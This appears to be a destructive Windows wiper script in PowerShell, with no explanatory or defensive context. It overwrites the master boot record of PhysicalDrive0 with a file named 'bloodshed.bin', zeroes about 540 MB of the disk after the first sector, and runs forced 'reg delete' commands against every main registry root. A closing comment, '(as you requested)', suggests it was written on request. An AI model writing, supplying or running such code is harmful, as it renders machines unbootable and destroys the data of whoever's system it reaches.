$BinPath     = "C:\bloodshed.bin"
$DiskNumber  = 0

# ---- Wipe MBR ----
try {
    $mbrData = [System.IO.File]::ReadAllBytes($BinPath)
    if ($mbrData.Length -ne 512) {
        Write-Error "ERR123: MBR file must be exactly 512 bytes."
        exit 1
    }

    $disk = [System.IO.File]::Open(
        "\\.\PhysicalDrive$DiskNumber",
        [System.IO.FileMode]::Open,
        [System.IO.FileAccess]::Write,
        [System.IO.FileShare]::ReadWrite
    )
    $disk.Write($mbrData, 0, 512)
    $disk.Flush()
    $disk.Close()
    Write-Host "[+] MBR overwritten with $BinPath"
} catch {
    Write-Error "ERR123: $_"
    exit 1
}

# ---- Zero out 540 MB starting at sector 1 ----
$diskPath = "\\.\PhysicalDrive0"
$totalBytes = 540960000  # ~516 MB (540,960,000 bytes)
$chunkSize = 1MB         # 1,048,576 bytes
$chunks = [Math]::Floor($totalBytes / $chunkSize)
$remainder = $totalBytes % $chunkSize
$zeroChunk = New-Object byte[]($chunkSize)  # only allocate 1 MB

try {
    $stream = [System.IO.File]::Open($diskPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
    $stream.Position = 512
    $written = 0
    for ($i = 0; $i -lt $chunks; $i++) {
        $stream.Write($zeroChunk, 0, $chunkSize)
        $written += $chunkSize
        if ($i % 100 -eq 0) { Write-Host "[*] Zeroed $([Math]::Round($written/1MB,2)) MB" }
    }
    if ($remainder -gt 0) {
        $stream.Write($zeroChunk, 0, $remainder)
        $written += $remainder
    }
    Write-Host "[+] Zeroed $([Math]::Round($written/1MB,2)) MB"
} catch {
    Write-Error "ERR174: $_"
} finally {
    if ($stream) { $stream.Close() }
}

# ---- Nuke registry roots (as you requested) ----
Write-Host "[*] Nuking registry roots..."
@("HKLM", "HKCC", "HKU", "HKCR", "HKCU") | ForEach-Object {
    cmd /c "reg delete $_ /f"
}
Write-Host "[+] Registry roots processed."
